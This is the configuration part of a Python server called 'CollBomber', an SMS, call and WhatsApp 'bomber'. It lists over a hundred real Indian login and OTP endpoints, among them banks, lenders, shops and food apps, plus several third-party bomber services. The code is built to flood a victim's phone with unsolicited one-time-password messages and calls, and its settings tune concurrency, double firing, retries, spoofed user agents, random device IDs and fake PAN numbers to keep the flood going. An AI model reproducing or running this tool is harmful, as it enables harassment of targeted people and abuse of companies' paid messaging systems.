#!/usr/bin/env python3
"""
🔥 CollBomber API Server — Remote API for thin client
All 155 APIs hosted here. Client just calls this server.
"""
import os
import sys
import json
import threading
import time
import random
import uuid
import re
import hashlib
import hmac
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from collections import defaultdict

# ========== CONFIG ==========
API_PORT = int(os.environ.get("API_PORT", 5000))
API_SECRET = os.environ.get("API_SECRET", "CollBomber@2026SecretKey")
API_AUTH_TOKEN = os.environ.get("API_AUTH_TOKEN", "spx_Rolex@2026_api")

# Bombing settings
MAX_WORKERS = 25
SMS_MAX_WORKERS = 80
DELAY_BETWEEN_ROUNDS = 0.5
SMS_DELAY_BETWEEN_ROUNDS = 0.15
SMS_DOUBLE_FIRE = True
SMS_AUTO_RETRY = True
IMPORTANT_CALL_INTERVAL = 5
IMPORTANT_5S_INTERVAL = 5

# ========== API CONFIG ==========
class ApiConfig:
    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms", delay_ms=0):
        self.name = name
        self.url = url
        self.method = method
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
        self.body = body
        self.category = category
        self.delay_ms = delay_ms

    def build_request(self, phone, duration=3):
        import requests as req_lib
        ts = str(int(time.time() * 1000))
        rand_id = uuid.uuid4().hex[:8]
        uid = uuid.uuid4().hex
        md5 = uid.replace("-", "")[:32]
        random_pan = random.choice(["ABCDE1234F", "GDODJ5434B", "GSISB5468H", "HSOSN5464B",
                                     "FUOUR2389B", "VUJVU5675H", "TSISV5434B"])

        url = self.url.format(phone=phone, timestamp=ts, random_id=rand_id,
                              uuid=uid, md5=md5, random_pan=random_pan,
                              imei1="".join([str(random.randint(0,9)) for _ in range(15)]),
                              device_id="DEV" + uuid.uuid4().hex[:12].upper())

        headers = dict(self.headers)
        headers.setdefault("User-Agent", random.choice([
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; OnePlus 10 Pro) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; vivo V2324) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 13; Redmi K50i) AppleWebKit/537.36",
        ]))
        headers.setdefault("Accept", "*/*")
        headers.setdefault("Accept-Language", "en-US,en;q=0.9,hi;q=0.8")
        headers.setdefault("Connection", "keep-alive")

        body = self.body
        if body:
            body = body.format(phone=phone, timestamp=ts, random_id=rand_id,
                               uuid=uid, md5=md5, random_pan=random_pan,
                               imei1="".join([str(random.randint(0,9)) for _ in range(15)]),
                               device_id="DEV" + uuid.uuid4().hex[:12].upper())

        r = req_lib.Request(self.method, url, headers=headers, data=body)
        return r

def get_all_apis():
    apis = []

    # --- CALL APIs ---
    call_apis = [
        ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),
        ApiConfig("1MG_Call", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":true}', "call"),
        ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
                  {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Myntra_Call", "https://www.myntra.com/gw/mobile-auth/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
        ApiConfig("Paytm_Call", "https://accounts.paytm.com/signin/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}', "call"),
        ApiConfig("Zomato_Call", "https://www.zomato.com/php/asyncLogin.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}", "call"),
        ApiConfig("MakeMyTrip_Call", "https://www.makemytrip.com/api/umbrella/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Uber_Call", "https://auth.uber.com/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BigBasket_Call", "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}"}', "call"),
        ApiConfig("PhonePe_Call", "https://www.phonepe.com/api/v2/otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("OYO_Call", "https://api.oyoroomscrm.com/api/v2/user/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Rapido_Call", "https://rapido.bike/api/v2/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("BookMyShow_Call", "https://in.bmscdn.com/mjson/User/SendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}"}', "call"),
        ApiConfig("Meesho_Call", "https://api.meesho.com/v2/auth/send_otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Snapdeal_Call", "https://www.snapdeal.com/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
        ApiConfig("Croma_Call", "https://api.croma.com/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
        ApiConfig("Call_Bomber", "https://call-bomber-50k3t8a6r.vercel.app/bomb?number={phone}", "GET",
                  {}, None, "call"),
        ApiConfig("Jio_Call", "https://www.jio.com/api/jio-login-service/login/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":"","circle":"MH"}', "call"),
    ]
    apis.extend(call_apis)

    # --- WHATSAPP APIs ---
    whatsapp_apis = [
        ApiConfig("KPN_WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":{"number":"{phone}","country_code":"+91"}}', "whatsapp"),
        ApiConfig("EkaCare_WhatsApp", "https://auth.eka.care/auth/init", "POST",
                  {"Content-Type": "application/json"}, '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}', "whatsapp"),
        ApiConfig("MamaEarth_WA", "https://auth.mamaearth.in/v1/auth/initiate-signup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "whatsapp"),
        ApiConfig("Havells_WA", "https://havells.com/otplogin/account/otploginpost/", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on", "whatsapp"),
        ApiConfig("HeroFinCorp_WA", "https://loans.apps.herofincorp.com/api/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","terms":true,"whatsapp":true}', "whatsapp"),
    ]
    apis.extend(whatsapp_apis)

    # --- ThakurBombCyber ---
    apis.append(ApiConfig("ThakurBombCyber", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
                          {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"))

    # --- FULL SMS APIs ---
    sms_apis = [
        ApiConfig("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phoneCode":"+91","telephone":"{phone}"}'),
        ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN"),
        ApiConfig("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Wakefit", "https://api.wakefit.co/api/consumer-sms-otp/", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Meru", "https://merucabapp.com/api/otp/generate", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
        ApiConfig("Doubtnut", "https://api.doubtnut.com/v4/student/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":8569363739,"countryCode":"+91","type":"login"}'),
        ApiConfig("ShipRocket", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/request", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Servetel", "https://api.servetel.in/v1/auth/otp", "POST",
                  {"Content-Type": "application/json"}, '{"email":"user{random_id}@mail.com","phone":"{phone}"}'),
        ApiConfig("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Housing", "https://login.housing.com/api/v2/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("RentoMojo", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered?number={phone}", "GET"),
        ApiConfig("Khatabook", "https://api.khatabook.com/v1/auth/request-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"+91"}'),
        ApiConfig("RummyCircle", "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","countryDialCode":"+91"}'),
        ApiConfig("Cosmofeed", "https://prod.api.cosmofeed.com/api/user/authenticate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","auth_type":"phone"}'),
        ApiConfig("Revv", "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init?phone={phone}&source=car", "GET"),
        ApiConfig("PayMe_India", "https://api.paymeindia.in/api/v2/authentication/phone_login", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
        ApiConfig("Bomberr", "https://bomberr.onrender.com/num={phone}", "GET"),
        ApiConfig("PaisaOnSalary", "https://cms.paisaonsalary.in/api/Api/Website/InstantJourneyController/add", "POST",
                  {"Content-Type": "application/json"}, '{"name":"Test","phone":"{phone}","state":"MH","city":"Mumbai","annualIncome":"600000","employmentType":"salaried","pan":"{random_pan}","salaryType":"credit","policyAgreed":"true","googleClientId":"test123","facebookClientId":"test123"}'),
        ApiConfig("PaisaBoxx", "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "POST",
                  {"Content-Type": "application/json", "Content-Length": "0"}, "{}"),
        ApiConfig("LoanZap", "https://webapi.loanzap.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}","name":"TestUser","loan_amount":"25000","loan_tenure":"12","utm_source":"organic"}'),
        ApiConfig("CashKredit", "https://api.cashkredit.in/v2/apply-loan/register-user", "POST",
                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}","name":"TestUser","loan_amount":"30000"}'),
        ApiConfig("RupeeLending", "https://rupeelending.com/apply-now/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("BrightLoans", "https://brightloans.in/login-sbm", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}"}'),
        ApiConfig("SalaryTopUp", "https://salarytopup.in/api/Api/Website/InstantJourneyController/add", "POST",
                  {"Content-Type": "application/json"}, '{"name":"Test","phone":"{phone}","state":"MH","city":"Mumbai","annualIncome":"500000"}'),
        ApiConfig("TezCredit", "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tezcredit.com", "referer": "https://www.tezcredit.com/", "Content-Length": "0"}, "{}"),
        ApiConfig("Swiggy_SMS", "https://www.swiggy.com/mapi/auth/sms-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.swiggy.com", "referer": "https://www.swiggy.com/auth"},
                  '{"mobile":"{phone}","_csrf":"wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk"}'),
        ApiConfig("TataCapital_HL", "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/"},
                  '{"mobileNumber":"9961021397","productType":"hl","utmSource":"Website","utmMedium":"Direct","utmCampaign":"HomeLoan","utmTerm":"","utmContent":"","visitorId":"test_visitor"}'),
        ApiConfig("TataCapital_PL", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnCall", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"false"}'),
        ApiConfig("TataCapital_LAP", "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","productType":"lap","utmSource":"Website","utmMedium":"Direct","utmCampaign":"Loan"}'),
        ApiConfig("Univest", "https://api.univest.in/api/auth/send-otp?type=web4&country_code=91&phone={phone}", "GET"),
        ApiConfig("HeroFinCorp_Festive", "https://festive.api.herofincorp.com/v1/customer/generateOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("INRFlash", "https://offers.inrflash.com/campinr/index.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}"),
        ApiConfig("CRMSL", "https://api.crmsl.com/Api/Website/InstantJourneyController/add", "POST",
                  {"Content-Type": "application/json"}, '{"name":"Test","phone":"{phone}","state":"MH","city":"Mumbai"}'),
        ApiConfig("Factori", "https://factori.com/login/check_user_exists", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}"),
        ApiConfig("OneMG", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":false}'),
        ApiConfig("ShipRocket2", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/request", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"web-checkout"}'),
        ApiConfig("EntriApp", "https://entri.app/api/v3/users/check-phone/", "POST",
                  {"Content-Type": "application/json", "origin": "https://learn.entri.app", "referer": "https://learn.entri.app/"},
                  '{"phone":"+91{phone}","recaptcha_response":"dummy_token"}'),
        ApiConfig("Apna", "https://production.apna.co/api/userprofile/v1/otp/", "POST",
                  {"Content-Type": "application/json", "origin": "https://apna.co", "referer": "https://apna.co/"},
                  '{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'),
        ApiConfig("DigiCredit", "https://customer-backend.digicredit.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Moglix", "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "POST",
                  {"Content-Type": "application/json"}, '{"contactNo":"{phone}","countryCode":"+91","requestType":"LOGIN"}'),
        ApiConfig("Housing2", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_WITH_PHONE", "POST",
                  {"Content-Type": "application/json"}, '{"variables":{"phone":"+91{phone}"},"query":"mutation($phone:String!){loginWithPhone(phone:$phone){status}}"}'),
        ApiConfig("MyMoneyBazaar", "https://mm-app-backend.mymoneybazaar.com/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Shopsy", "https://www.shopsy.in/1.rome/api/1/action/view", "POST",
                  {"Content-Type": "application/json"}, '{"url":"/signup","pageType":"SignUpPage","phoneNumber":"{phone}"}'),
        ApiConfig("KamakshiMoney", "https://loan-api.kamakshimoney.com/customers/customer-login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
        ApiConfig("PrimeCash", "https://api.primecash.app/api/v1/user", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Allen", "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=web&country_code=91&mobile={phone}", "GET"),
        ApiConfig("RupeeCare", "https://rc-backend.root.deployment.rupeecare.money/api/auth/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_type":"customer"}'),
        ApiConfig("Rupyalelo", "https://apply.rupyalelo.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123"}'),
        ApiConfig("RoopyaMoney", "https://api.roopya.money/api/v2/customer/lead", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","name":"Test","city":"Mumbai","state":"MH"}'),
        ApiConfig("Dhanrishi", "https://ub1.dhanrishi.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("SalaryOnTime", "https://journey.sotcrm.com/api/v1/journey-auth/send-otp?source=WEB&phone={phone}&state=MH", "GET"),
        ApiConfig("SpeedoLoan", "https://loanapply.speedoloan.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123"}'),
        ApiConfig("FastSalary", "https://apilm.fastsalary.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("CredNidhi", "https://apilm.crednidhi.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("ClickMyLoan", "https://appb.clickmyloan.com/api/v2/authentication/phone-login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"+91"}'),
        ApiConfig("SuryaLoan", "https://microservices.suryaloan.com/api/v1/customer-journey/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"website"}'),
        ApiConfig("CreditSea", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
        ApiConfig("SalarySetu", "https://backend.salarysetu.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("ShreeLoan", "https://loanapply.shreeloan.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123"}'),
        ApiConfig("PocketCredit", "https://pocketcredit.in/api/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("ClickForMoney", "https://clickformoney.in/api/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("JhatpatCash", "https://apilm.jhatpatcash.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("QuaLoan", "https://apilm.qualoan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("NexiLoans", "https://api-backend.nexiloans.com/user/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("ToofanLoan", "https://apilm.toofanloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Rupee4u", "https://loanapply.rupee4u.com/api/login", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123"}'),
        ApiConfig("PaisaPop", "https://apilm.paisapop.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Figii", "https://consumer.figii.in/api/auth/login/?mobile={phone}&partner=figii", "GET"),
        ApiConfig("MinutesLoan", "https://apilm.minutesloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("AyushmanLoan", "https://backend.ayushmanloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Creditt", "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}","source":"web","country_code":"+91"}'),
        ApiConfig("FundsBull", "https://backend.fundsbull.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("F1SpeedLoan", "https://backend.f1speedloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("FundoBaba", "https://backend.fundobaba.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("RupeeRedee", "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP/SendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"otpChannel":"sms","mobileNumber":"{phone}","countryCode":"+91"}'),
        ApiConfig("UdhaarPortal", "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/add", "POST",
                  {"Content-Type": "application/json"}, '{"name":"Test","phone":"{phone}","state":"MH"}'),
        ApiConfig("DuniyaFinance", "https://backend.duniyafinance.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("BlinkrLoan", "https://backend.blinkrloan.com/api/user/v3/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"web"}'),
        ApiConfig("NaukriLoans", "https://backend.naukriloans.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("UdharCapital", "https://www.udharcapital.com/api/send_otp.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}"),
        ApiConfig("SalaryBolt", "https://backend.salarybolt.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("SabkaLoan", "https://api.sabkaloan.com/api/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("PaisaInTime", "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("FastPaise", "https://backend.fastpaise.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("OTPBomber", "https://otpbomber-40jd.onrender.com/api/bomb", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","country_code":"91"}'),
        ApiConfig("RamFincorp", "https://loan-api.ramfincorp.com/customers/customer-login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","event_name":"login"}'),
        ApiConfig("InCred", "https://gateway-api.incred.com/website-bff/public/v1/common/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","countryCode":"+91"}'),
        ApiConfig("Sephora", "https://sephora.in/api/service/application/user/authenticate/mobile/data?mobile={phone}", "POST",
                  {"Content-Type": "application/json"}, '{}'),
        ApiConfig("Cashvia", "https://customer-backend.cashvia.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("RojgarKaro_SendOTP", "https://rojgarkaro.in/api/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("RojgarKaro_Signup", "https://rojgarkaro.in/api/auth/sendOTPOnSignup", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("BajajFinserv", "https://apigateway.bajajfinserv.in/apigateway/otp/sso/v1/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","appId":"BAJAJ_FINSERV_WEB"}'),
        ApiConfig("TataCliq", "https://www.tatacliq.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"countryCode":"+91","phoneNumber":"{phone}"}'),
        ApiConfig("Droom", "https://api.droom.in/v1/user/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Yatra", "https://secure.yatra.com/social/common/yatra/action/doMobileOtp", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}"),
        ApiConfig("Licious", "https://www.licious.com/auth/api/v1/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("CureFoods", "https://web.curefoods.com/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"+91"}'),
        ApiConfig("Puma", "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpSend", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobileNumber={phone}"),
        ApiConfig("Decathlon", "https://www.decathlon.in/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("McDonalds", "https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Dominos", "https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"WEB"}'),
        ApiConfig("Zivame", "https://www.zivame.com/auth/public/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("FirstCry", "https://www.firstcry.com/api/v2/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"username":"{phone}","source":"web"}'),
        ApiConfig("Netmeds", "https://www.netmeds.com/api/v1/auth/login", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Tata1mg", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":false}'),
        ApiConfig("Upstox", "https://api.upstox.com/v2/login/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}","client_id":"100"}'),
        ApiConfig("Zerodha", "https://kite.zerodha.com/api/login", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded"}, "user_id={phone}"),
        ApiConfig("Groww", "https://groww.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","state":"web"}'),
        ApiConfig("PolicyBazaar", "https://www.policybazaar.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
        ApiConfig("Ditto", "https://www.dittotv.in/auth/sendOTP/v1", "POST",
                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"web"}'),
        ApiConfig("SonyLiv", "https://www.sonyliv.com/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Hotstar", "https://api.hotstar.com/r9/v1/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}","_source":"web"}'),
        ApiConfig("BookMyShow_SMS", "https://in.bookmyshow.com/auth/send/otp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}","source":"web"}'),
        ApiConfig("RentoMojo_Signup", "https://www.rentomojo.com/api/RMUsers/signup", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","name":"TestUser","password":"Test@123"}'),
        ApiConfig("Furlenco", "https://www.furlenco.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("CityFurnish", "https://www.cityfurnish.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Ixigo", "https://www.ixigo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("EaseMyTrip", "https://www.easemytrip.com/api/otp/SendOtp", "POST",
                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}"}'),
        ApiConfig("Goibibo", "https://www.goibibo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("RedBus", "https://www.redbus.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
        ApiConfig("Rapido_SMS", "https://rapido.bike/api/v1/otp/generate", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("PocketMoney", "https://api2.the-pocket-money.com/pokktmoney/send_verification_code", "POST",
                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","countryCode":"91"}'),
        ApiConfig("ThakurBombCyber_5s", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
                  {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
    ]
    apis.extend(sms_apis)
    return apis

ALL_APIS = get_all_apis()
